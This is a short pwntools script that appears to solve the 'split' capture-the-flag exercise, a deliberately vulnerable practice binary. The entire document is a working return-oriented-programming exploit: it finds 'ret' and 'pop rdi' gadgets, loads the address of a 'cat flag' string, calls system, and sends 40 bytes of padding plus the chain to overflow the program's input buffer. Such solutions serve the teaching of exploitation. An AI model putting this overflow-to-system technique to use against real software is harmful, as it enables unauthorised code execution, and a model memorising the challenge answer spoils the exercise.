#!/usr/bin/env python3

from pwn import *

exe = "./split"
context.binary = elf = ELF(exe, checksec=False)
rop = ROP(elf)
io = process(exe)

ret = rop.find_gadget(['ret'])

pop_rdi = rop.find_gadget(['pop rdi'])

cat_flag = 0x601060

rop.call(ret)
# 1
rop.call(pop_rdi)
rop.raw(cat_flag)
rop.system()
# OR rop.system(cat_flag)

print(rop.dump())
io.sendlineafter(b"> ", b"A"* 40 + rop.chain())

print(io.recvall())

